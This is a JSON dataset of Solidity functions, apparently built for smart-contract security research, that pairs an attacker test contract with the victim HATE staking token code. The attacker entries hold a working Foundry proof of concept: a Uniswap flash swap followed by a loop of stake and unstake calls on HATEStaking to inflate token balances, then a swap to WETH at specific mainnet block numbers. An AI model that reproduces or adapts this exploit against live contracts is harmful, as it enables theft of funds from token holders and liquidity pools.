[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n        vm.label(address(HATE), \"HATE\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(HATE_ETH_Pair), \"Uniswap HATE\");\n        vm.label(address(HATEStaking), \"HATEStaking\");\n        vm.label(address(sHATE), \"sHATE\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit1",
    "original_code": "    function testExploit1() external {\n        vm.rollFork(18_069_528 - 1);\n        approveAll();\n        console.log(\"Before Start: %d ETH\", WETH.balanceOf(address(this)));\n        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair)) * 9 / 10;\n        HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex\"03\");\n\n        address[] memory path = new address[](2);\n        (path[0], path[1]) = (address(HATE), address(WETH));\n        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            HATE.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n        emit log_named_decimal_uint(\"WETH balance after swap\", WETH.balanceOf(address(this)), WETH.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit2",
    "original_code": "    function testExploit2() external {\n        vm.rollFork(18_071_199 - 1);\n        approveAll();\n        console.log(\"Before Start: %d ETH\", WETH.balanceOf(address(this)));\n        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair)) * 7 / 10;\n        HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex\"1e\");\n\n        address[] memory path = new address[](2);\n        (path[0], path[1]) = (address(HATE), address(WETH));\n        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            HATE.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n        emit log_named_decimal_uint(\"WETH balance after swap\", WETH.balanceOf(address(this)), WETH.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address, /*sender*/ uint256 amount0, uint256, /*amount1*/ bytes calldata data) external {\n        uint256 i = 0;\n        while (i < uint8(data[0])) {\n            uint256 balanceAttacker = HATE.balanceOf(address(this));\n            HATEStaking.stake(address(this), balanceAttacker);\n            uint256 sTokenBalance = sHATE.balanceOf(address(this));\n            HATEStaking.unstake(address(this), sTokenBalance, true);\n            i += 1;\n        }\n        HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "circulatingSupply",
    "original_code": "    function circulatingSupply() public view override returns (uint256) {\n        return\n            _totalSupply - balanceOf(stakingContract);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "rebase",
    "original_code": "    function rebase(uint256 amount_, uint256 epoch_) public override onlyStakingContract returns (uint256) {\n        uint256 rebaseAmount;\n        uint256 circulatingSupply_ = circulatingSupply();\n        if (amount_ == 0) {\n            emit LogSupply(epoch_, _totalSupply);\n            emit LogRebase(epoch_, 0, index());\n            return _totalSupply;\n        } else if (circulatingSupply_ > 0) {\n            rebaseAmount = amount_ * _totalSupply / circulatingSupply_;\n        } else {\n            rebaseAmount = amount_;\n        }\n\n        _totalSupply = _totalSupply + rebaseAmount;\n\n        if (_totalSupply > MAX_SUPPLY) {\n            _totalSupply = MAX_SUPPLY;\n        }\n\n        _gonsPerFragment = TOTAL_GONS / _totalSupply;\n\n        _storeRebase(circulatingSupply_, amount_, epoch_);\n\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IsHATE",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Staking",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(\n        address _to,\n        uint256 _amount\n    ) external;\n\n    function unstake(\n        address _to,\n        uint256 _amount\n    ) external;\n\n",
    "description": ""
  },
  {
    "contract/interface": "Staking",
    "source_type": "victim_contract",
    "function_name": "unstake",
    "original_code": "    function unstake(\n        address _to,\n        uint256 _amount\n    ) external;\n\n",
    "description": ""
  }
]